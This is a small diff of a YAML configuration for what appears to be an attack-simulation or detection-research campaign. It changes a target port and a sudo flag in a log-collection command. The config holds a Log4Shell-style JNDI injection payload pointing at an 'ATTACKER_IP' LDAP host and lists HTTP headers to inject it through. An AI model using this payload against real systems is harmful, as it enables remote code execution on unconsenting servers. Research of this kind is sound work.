@@ -82,7 +82,7 @@ campaign:
       attack_stage: initial_access
       severity: 3
       params:
-        target_port: 8080
+        target_port: 80
         path: /
         jndi_string: "${jndi:ldap://ATTACKER_IP:1389/exploit}"
         injection_headers: ["X-Api-Version", "User-Agent", "Referer",
@@ -129,7 +129,7 @@ campaign:
         remote_command: "journalctl --since '1 hour ago' -o json"
       - name: auditd
         parser: auditd
-        remote_command: "sudo ausearch -k research_exploit --raw"
+        remote_command: "sudo -n ausearch -k research_exploit --raw"
     output:
       db_path: data/campaigns.db
       time_buffer_seconds: 60
